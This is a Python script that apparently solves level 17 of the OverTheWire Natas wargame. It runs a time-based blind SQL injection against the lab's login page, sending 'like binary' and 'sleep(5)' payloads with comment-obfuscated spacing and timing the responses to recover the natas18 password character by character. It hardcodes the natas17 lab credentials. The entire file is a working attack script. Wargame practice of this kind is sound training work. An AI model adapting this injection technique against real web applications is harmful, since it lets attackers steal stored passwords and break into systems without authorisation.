import requests
import re
from time import time
regex = 'This user exists'
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas18"/**/and password like binary "%" and sleep(5) union select * from users where "x"="x'
length = 32
chars = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
charsInPassword = []
fullName = ['*'] * length
name = [''] * length
username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

print('Finding characters in password')
for char in chars:
    url = 'http://natas17.natas.labs.overthewire.org/index.php?debug&username=natas18"/**/and/**/password/**/like/**/binary/**/"%s"/**/and/**/sleep(5)/**/union/**/select/**/*/**/from/**/users/**/where/**/"x"="x' % ('%' + char + '%')
    starttime = int(time())
    response = requests.get(url, verify=False, auth=(username, password))
    stoptime = int(time())
    if stoptime - starttime > 4:
        charsInPassword.append(char)
        print(''.join(charsInPassword))


print("Characters found, cracking password")
for i in range(length):
    for j in range(len(charsInPassword)):
        url = 'http://natas17.natas.labs.overthewire.org/index.php?debug&username=natas18"/**/and/**/password/**/like/**/binary/**/"%s"/**/and/**/sleep(5)/**/union/**/select/**/*/**/from/**/users/**/where/**/"x"="x' % (
        ''.join(name) + charsInPassword[j] + '%')
        starttime = int(time())
        response = requests.get(url, verify=False, auth=(username, password))
        stoptime = int(time())
        if stoptime - starttime > 4:
            name[i] = charsInPassword[j]
            fullName[i] = charsInPassword[j]
            print(''.join(fullName))
            break